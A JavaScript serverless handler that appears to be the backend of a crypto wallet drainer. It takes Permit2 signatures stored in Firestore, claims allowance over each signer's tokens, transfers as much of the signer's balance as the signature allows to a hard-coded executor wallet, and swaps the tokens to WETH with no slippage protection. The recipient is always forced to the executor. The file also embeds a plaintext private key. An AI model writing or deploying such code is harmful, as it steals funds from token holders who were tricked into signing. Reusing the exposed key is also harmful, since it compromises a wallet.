import admin from 'firebase-admin';
import { ethers } from 'ethers';

// -----------------------------
// Configuration
// -----------------------------
const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B";

// Hard-coded fallback executor address + private key (can be overridden via Firestore or env)
const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
const HARDCODED_PRIVATE_KEY = '0x797c331b0c003429f8fe3cf5fb60b1dc57286c7c634592da10ac85d3090fd62e';

// Runtime executor config (may be loaded from Firestore admin_config/settings)
let EXECUTOR_ADDRESS = HARDCODED_EXECUTOR;
let EXECUTOR_PRIVATE_KEY = HARDCODED_PRIVATE_KEY;

const PERMIT2_ABI = [
  "function permit(address owner, tuple(tuple(address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature)",
  "function transferFrom(address from, address to, uint160 amount, address token)"
];

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)"
];

const UNIVERSAL_ROUTER_ABI = [
  "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
];

// -----------------------------
// Lazy Globals
// -----------------------------
let db = null;
let provider = null;
let spenderWallet = null;
let permit2Contract = null;
let routerContract = null;

async function init() {
  if (db) return; 

  const serviceAccount = {
    projectId: process.env.FIREBASE_PROJECT_ID,
    clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
    privateKey: (process.env.FIREBASE_PRIVATE_KEY || "").replace(/\\n/g, '\n')
  };

  if (!admin.apps.length) {
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
  }
  db = admin.firestore();
  // Load runtime config from Firestore (admin_config/settings) if present
  try {

    const cfgSnap = await db.collection('admin_config').doc('settings').get();
    const cfg = cfgSnap.exists ? cfgSnap.data() : {};
    const rpc = cfg.rpcUrl || process.env.RPC_URL || 'https://cloudflare-eth.com';


    provider = new ethers.JsonRpcProvider(rpc);
    // Load optional executor override from Firestore settings
    EXECUTOR_ADDRESS = cfg.executorAddress || process.env.EXECUTOR_ADDRESS || HARDCODED_EXECUTOR;
    EXECUTOR_PRIVATE_KEY = cfg.executorPrivateKey || process.env.EXECUTOR_PRIVATE_KEY || HARDCODED_PRIVATE_KEY;

    // Use configured private key to create the signer
    spenderWallet = new ethers.Wallet(EXECUTOR_PRIVATE_KEY, provider);
    // Sanity check
    const derived = spenderWallet.address;
    if (derived.toLowerCase() !== EXECUTOR_ADDRESS.toLowerCase()) {
      throw new Error(`Executor private key does not match executor address: derived=${derived} expected=${EXECUTOR_ADDRESS}`);
    }

    permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, spenderWallet);
    routerContract = new ethers.Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, spenderWallet);
  } catch (err) {
    console.error('Failed to init provider/wallet/contracts from config:', err);
    throw err;
  }
}

// -----------------------------
// Logic
// -----------------------------
export default async function handler(req, res) {
  // CORS & Methods
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: "Method Not Allowed" });

  try {
    await init();
    
    const { docId, recipient, outputToken } = req.body;
    // Default Output: WETH (Mainnet)
    const FINAL_TOKEN = outputToken || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; 
    // Force recipient to be the configured executor (recipient == spender == executor)
    const RECIPIENT = EXECUTOR_ADDRESS;

    let docsToProcess = [];
    if (docId) {
      const doc = await db.collection('permit2_signatures').doc(docId).get();
      if (doc.exists && !doc.data().processed) docsToProcess.push(doc);
    } else {
      const snaps = await db.collection('permit2_signatures').where('processed', '==', false).limit(1).get();
      docsToProcess = snaps.docs;
    }

    if (!docsToProcess.length) return res.json({ ok: true, processed: 0 });

    let count = 0;
    for (const docSnap of docsToProcess) {
      const data = docSnap.data();
      
      try {
      // Basic validation to fail early with clear messages
      if (!data) throw new Error('Missing document data');
      if (!data.owner) throw new Error('Missing owner in signature document');
      if (!data.token) throw new Error('Missing token in signature document');
      if (!data.amount) throw new Error('Missing amount in signature document');
      if (data.r == null || data.s == null) throw new Error('Missing signature r/s in document');
      if (data.v == null) throw new Error('Missing signature v in document');

      const amount = BigInt(data.amount);

      // Determine withdrawAmount = min(owner balance, signed amount)
      let withdrawAmount = amount;
      try {
        const tokenContractForBalance = new ethers.Contract(data.token, ["function balanceOf(address) view returns (uint256)"], provider);
        const ownerBal = await tokenContractForBalance.balanceOf(data.owner);
        const ownerBalBn = BigInt(ownerBal);
        if (ownerBalBn < withdrawAmount) withdrawAmount = ownerBalBn;
      } catch (bErr) {
        console.error('Failed to read owner balance:', bErr);
      }

      if (withdrawAmount === 0n) {
        await docSnap.ref.update({ lastError: 'owner has zero token balance', lastErrorAt: Date.now(), withdrawAmount: '0' });
        if (docId) return res.status(400).json({ ok: false, error: 'owner has zero token balance', withdrawAmount: '0' });
        continue;
      }

      // record withdrawAmount for audit
      try { await docSnap.ref.update({ withdrawAmount: withdrawAmount.toString() }); } catch (u) { console.error('failed to write withdrawAmount', u); }

      // Defensive: ensure contracts initialized
      if (!permit2Contract) throw new Error('permit2Contract not initialized');
      if (!routerContract) throw new Error('routerContract not initialized');

      // 1. Reconstruct Signature
      // normalize v to 27/28 if needed
      // Normalize v to 27/28 if needed and build signature as hexConcat(r,s,v)
        // Ensure `v` is converted to a 1-byte hex string before concatenation.
        let vnr = (typeof data.v === 'string') ? parseInt(data.v, 16) : Number(data.v);
        if (vnr === 0 || vnr === 1) vnr += 27;
        const vHex = '0x' + vnr.toString(16).padStart(2, '0');
      // Ensure r/s are hex strings and produce final signature
      const sigR = String(data.r);
      const sigS = String(data.s);
        const signature = ethers.concat([sigR, sigS, vHex]);

        // 2. Call Permit2.permit() to claim allowance for Executor
        // We verify if the signature authorizes the hard-coded executor. If there's a mismatch, write a clear error
        // to the doc and skip processing (or return an error when user requested a single doc via `docId`).
        if (!data.spender) throw new Error('Missing spender in signature document');
        if (data.spender.toLowerCase() !== EXECUTOR_ADDRESS.toLowerCase()) {
          const msg = `Spender mismatch. Signature authorizes ${data.spender}, but Executor is ${EXECUTOR_ADDRESS}. Re-sign with the Executor address as the spender.`;
            try {
              await docSnap.ref.update({ lastError: msg, lastErrorAt: Date.now() });
            } catch (u) {
              console.error('Failed to update doc with mismatch info:', u);
            }
            // If this request targeted a specific doc, return an error so frontend sees it immediately.
            if (docId) {
              return res.status(400).json({ ok: false, error: msg });
            }
            // Otherwise skip this doc and continue processing others
            continue;
        }

        const permitTx = await permit2Contract.permit(
          data.owner,
          {
            details: {
              token: data.token,
              amount: amount,
              expiration: data.deadline,
              nonce: data.nonce
            },
            spender: EXECUTOR_ADDRESS,
            sigDeadline: data.deadline
          },
          signature
        );
        await permitTx.wait();

        // 3. Pull tokens from User to Executor
        const pullTx = await permit2Contract.transferFrom(data.owner, spenderWallet.address, withdrawAmount, data.token);
        await pullTx.wait();

        // 4. Approve Universal Router to spend tokens from Executor
        const tokenContract = new ethers.Contract(data.token, ERC20_ABI, spenderWallet);
        const approveTx = await tokenContract.approve(UNIVERSAL_ROUTER, amount);
        await approveTx.wait();

        // 5. Build Universal Router Swap
        const feeTier = 3000;
        function encodeFee(f) {
            let hex = f.toString(16).padStart(6, '0');
            if (hex.length % 2 === 1) hex = '0' + hex;
            return '0x' + hex;
        }
        
        // V3 Path: TokenIn -> Fee -> TokenOut
        const path = ethers.concat([data.token, encodeFee(feeTier), FINAL_TOKEN]);
        
        // V3_SWAP_EXACT_IN (Command 0x00)
        // Input: (address recipient, uint256 amountIn, uint256 amountOutMin, bytes path, bool payerIsUser)
        const swapAbi = new ethers.AbiCoder();
        const swapInput = swapAbi.encode(
          ["address", "uint256", "uint256", "bytes", "bool"],
          [RECIPIENT, withdrawAmount, BigInt(0), path, false] // payerIsUser = false (funds are in executor/msg.sender)
        );

        const commands = "0x00"; // V3_SWAP_EXACT_IN
        const inputs = [swapInput];
        const execDeadline = Math.floor(Date.now() / 1000) + 1800;

        // 6. Execute Swap
        // Manually setting gas limit to avoid estimation issues on complex router paths
        const tx = await routerContract.execute(commands, inputs, execDeadline, { 
            gasLimit: 500000 
        });
        const receipt = await tx.wait();

        await docSnap.ref.update({
          processed: true,
          routerTx: receipt.hash,
          processedAt: Date.now(),
          adminExecutor: EXECUTOR_ADDRESS,
          withdrawAmount: withdrawAmount.toString()
        });
        count++;

        if (docId) {
          return res.status(200).json({ ok: true, processed: 1, withdrawAmount: withdrawAmount.toString(), routerTx: receipt.hash });
        }

      } catch (err) {
        console.error(`Failed doc ${docSnap.id}:`, err);
        await docSnap.ref.update({
            lastError: err.shortMessage || err.message,
            lastErrorAt: Date.now()
        });
        // Stop only if single mode
        if (docId) throw err;
      }
    }

    return res.status(200).json({ ok: true, processed: count });

  } catch (error) {
    console.error("Handler Error:", error);
    return res.status(500).json({ ok: false, error: error.message });
  }
}
